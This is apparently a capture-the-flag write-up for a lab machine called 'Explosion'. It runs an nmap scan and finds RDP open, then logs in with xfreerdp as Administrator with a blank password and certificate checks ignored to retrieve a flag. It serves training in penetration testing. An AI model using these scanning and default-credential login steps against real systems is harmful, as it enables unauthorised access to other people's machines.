# Explosion

# TL;DR

- Misconfigured RDP service on the target machine that allows us to connect to the target host using `xfreerdp` cli and login using a common username (`Adminstrator`) and no password. 

# Enumeration

- `ping 10.129.1.13` : to test if the server us up and running.
- We scan the host to determine running services:
```
nmap -p- -sV 10.129.1.13
Starting Nmap 7.93 ( https://nmap.org ) at 2023-12-29 21:32 PST
Nmap scan report for 10.129.1.13
Host is up (0.085s latency).
Not shown: 996 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.76 seconds
```
- From the output of the scan we find multiple ports open.
- After researching the services running on each port the one we find most intresting is `3389/tcp` that is used for Windows Remote Desktop and Remote assistance connection (RDP-Remote Desktop Protocol).

# Foothold

 - We try to connect to the target host using `xfreerdp` cli. We can install it with `sudo apt-get install freerdp2-x11` if it does not currently exist on the local host.
 - Whwn we run `xfreerdp /v:10.129.1.13` to connect to the host it throws an error. Since we did not provide a username in the command it take our local user as the default user.
 ```
 xfreerdp /v:10.129.1.13
[21:36:57:739] [857106:857107] [INFO][com.freerdp.client.x11] - No user name set. - Using login name: root
[21:36:58:257] [857106:857107] [WARN][com.freerdp.crypto] - Certificate verification failure 'self-signed certificate (18)' at stack position 0
[21:36:58:257] [857106:857107] [WARN][com.freerdp.crypto] - CN = Explosion
Domain:   
Password: 
[21:37:00:107] [857106:857107] [ERROR][com.freerdp.core] - transport_ssl_cb:freerdp_set_last_error_ex ERRCONNECT_PASSWORD_CERTAINLY_EXPIRED [0x0002000F]
[21:37:00:107] [857106:857107] [ERROR][com.freerdp.core.transport] - BIO_read returned an error: error:0A000438:SSL routines::tlsv1 alert internal error
 ```
 - We can try myriad of other default usernames. We try `Administrator` as the username and when prompted for a password we can just press `enter`. We are now connected to the remote host and are able to retrieve the flag file on the desktop.
 ```
 xfreerdp /v:10.129.1.13 /cert:ignore /u:Administrator
Password: 
[21:38:55:607] [857720:857721] [INFO][com.freerdp.gdi] - Local framebuffer format  PIXEL_FORMAT_BGRX32
[21:38:55:607] [857720:857721] [INFO][com.freerdp.gdi] - Remote framebuffer format PIXEL_FORMAT_BGRA32
[21:38:55:623] [857720:857721] [INFO][com.freerdp.channels.rdpsnd.client] - [static] Loaded fake backend for rdpsnd
[21:38:55:624] [857720:857721] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel rdpgfx
[21:38:56:485] [857720:857721] [INFO][com.freerdp.client.x11] - Logon Error Info LOGON_FAILED_OTHER [LOGON_MSG_SESSION_CONTINUE]
[21:39:14:080] [857720:857720] [ERROR][com.freerdp.core] - freerdp_abort_connect:freerdp_set_last_error_ex ERRCONNECT_CONNECT_CANCELLED [0x0002000B]
 ```
 \* the `/cert:ignore` flag in the command above specifies to the script that all security certificates usage should be ignored.